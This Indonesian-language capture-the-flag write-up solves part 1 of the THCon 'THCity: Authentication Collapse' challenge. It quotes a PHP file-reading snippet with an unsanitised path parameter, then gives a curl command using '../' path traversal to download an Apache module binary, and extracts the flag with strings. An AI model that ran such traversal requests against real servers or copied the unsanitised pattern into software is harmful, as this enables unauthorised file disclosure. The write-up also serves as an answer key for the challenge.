# Writeup: THCity: Authentication Collapse (part 1/2)

## 1. Analisis Awal
Setelah melihat file yang diberikan (Docker environment), saya menemukan beberapa komponen utama:
- `flag_server`: Server Apache dengan PHP yang menjalankan modul kustom `mod_auth_thcity.so`.
- `sso_server`: Server SSO berbasis Node.js/Express.
- `redis`: Tempat penyimpanan flag utama.

Di file `flag_server/Dockerfile`, ada petunjuk menarik:
> `# First flag is only in the compiled module ".so"`

Ini artinya flag untuk part 1 disisipkan ke dalam binary modul Apache saat proses build.

## 2. Menemukan Vulnerability
Saya mengecek file `flag_server/image.php`:
```php
$img = "./images/" . $_GET["img"] ?? "";
if(is_file($img)){
  readfile($img);
}
```
File ini memiliki celah **Local File Inclusion (LFI)** karena parameter `img` tidak disanitasi. Saya bisa menggunakannya untuk membaca file apa pun di server.

## 3. Eksploitasi
Karena saya butuh file `.so` modul Apache, saya mencoba menebak lokasinya. Biasanya di sistem Debian (seperti image `php:8.2-apache`), modul berada di `/usr/lib/apache2/modules/mod_auth_thcity.so`.

Saya mendownload file tersebut menggunakan LFI:
```bash
curl -s "http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../../../usr/lib/apache2/modules/mod_auth_thcity.so" --output mod_auth_thcity.so
```

Setelah file berhasil didownload, saya mencari string flag di dalamnya:
```bash
strings mod_auth_thcity.so | grep "{"
```

Ditemukan flag:
**THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}**

## 4. Kesimpulan
Flag part 1 berhasil ditemukan di dalam binary modul Apache. Isi flag tersebut (`S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG`) memberikan petunjuk kuat bahwa part 2 akan melibatkan teknik SSRF melalui header injection dan HTTP pipelining pada modul tersebut untuk melewati otentikasi SSO dan mengakses Redis.
